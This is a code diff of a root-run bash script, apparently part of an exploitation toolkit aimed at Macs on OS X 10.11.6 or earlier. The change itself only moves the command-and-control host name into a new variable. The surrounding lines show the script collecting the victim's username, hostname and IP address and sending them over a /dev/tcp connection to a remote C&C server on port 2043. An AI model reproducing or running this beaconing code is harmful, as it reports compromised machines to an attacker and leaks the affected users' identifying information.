@@ -1,6 +1,7 @@
 #!/bin/bash
 # MUST be run as root. jm.sh should be used to automate exploitation and running of
 # this script on Macs running OS X <= 10.11.6.
+host=boesen.science
 
 # Some programs aren't in $PATH by default
 export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:$PATH
@@ -25,11 +26,10 @@ ip=$(/sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([
 
 info="$user $hostname $ip"
 
-server="boesen.science"
 port=2043
 
 # Send data to C&C
-exec 3<>/dev/tcp/$server/$port
+exec 3<>/dev/tcp/$host/$port
 printf "JOIN: $info" >&3
 
 function timeout() { perl -e 'alarm shift; exec @ARGV' "$@"; }
